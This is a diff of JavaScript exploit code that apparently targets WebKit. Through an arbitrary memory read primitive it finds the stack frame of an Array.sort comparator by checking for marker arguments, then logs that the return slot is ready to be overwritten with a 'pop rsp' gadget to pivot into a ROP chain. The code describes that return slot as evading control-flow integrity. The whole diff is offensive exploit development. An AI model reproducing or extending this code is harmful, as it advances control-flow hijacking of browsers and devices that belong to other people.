@@ -296,25 +296,40 @@ async function prepare(p) {
         arr.sort(comparator);
 
         jbmark("SELF-FRAMES", "callee-slots-found=" + frames.length);
+        // The comparator is called from C++ (sort) via the VM entry, so its
+        // returnPC is a VM-entry trampoline, NOT WebKit .text -- that is fine,
+        // the pivot works regardless. Identify the REAL live CallFrame by its
+        // ARGUMENTS: callee at CallFrame+0x18 means arg0 is at +0x18 and arg1 at
+        // +0x20 from the callee slot, and they must be our two boxed markers.
+        const TAG = 0xffff0000;
+        function isMarker(v, m) { return (v.hi >>> 0) === TAG && (v.low >>> 0) === (m >>> 0); }
         let good = null;
         for (let n = 0; n < frames.length; n++) {
             const f = frames[n];
+            const argCount = p.read8(f.calleeSlot.add32(0x08));
+            const arg0 = p.read8(f.calleeSlot.add32(0x18));
+            const arg1 = p.read8(f.calleeSlot.add32(0x20));
+            const markerFrame =
+                (isMarker(arg0, M0) && isMarker(arg1, M1)) ||
+                (isMarker(arg0, M1) && isMarker(arg1, M0));
             jbmark("SELF-FRAME", "#" + n + "-stack=0x" + f.base.toString()
                 + "-off=0x" + f.o.toString(16)
                 + "-returnPC=0x" + f.retPC.toString()
-                + (f.inWk ? "(wk+0x" + f.rva.toString(16) + ")" : "(NOT wk)")
-                + "-retSlot=0x" + f.retSlot.toString());
-            if (f.inWk && !good) good = f;
+                + "-argc=0x" + argCount.toString()
+                + "-arg0=0x" + arg0.toString() + "-arg1=0x" + arg1.toString()
+                + "-MARKERFRAME=" + markerFrame);
+            if (markerFrame && !good) good = f;
         }
         if (!good)
-            throw new Error("selfstack: found " + frames.length + " callee refs "
-                + "but none had a WebKit returnPC at CallFrame+0x08 -- comparator "
-                + "may be JIT-compiled (no standard CallFrame). Force interpreter.");
-        jbmark("SELF-LOCATE-OK", "comparator CallFrame located; returnPC=wk+0x"
-            + good.rva.toString(16) + " at retSlot=0x" + good.retSlot.toString()
-            + " -- this is the CFI-immune ret slot to hijack");
-        throw new Error("selfstack locate OK: returnPC=wk+0x" + good.rva.toString(16)
-            + " at 0x" + good.retSlot.toString() + ". Next: overwrite to pivot.");
+            throw new Error("selfstack: " + frames.length + " callee refs but none "
+                + "carried our markers as args -- the comparator frame layout "
+                + "differs; inspect the SELF-FRAME dumps.");
+        jbmark("SELF-LOCATE-OK", "comparator CallFrame VERIFIED by its args; "
+            + "returnPC (trampoline) at retSlot=0x" + good.retSlot.toString()
+            + "-cbSlot=0x" + good.cbSlot.toString()
+            + " -- overwrite retSlot=pop rsp, cbSlot=chain_entry to pivot");
+        throw new Error("selfstack locate OK: comparator CallFrame verified; "
+            + "ret slot 0x" + good.retSlot.toString() + " ready to hijack.");
     }
 
     // -----------------------------------------------------------------------
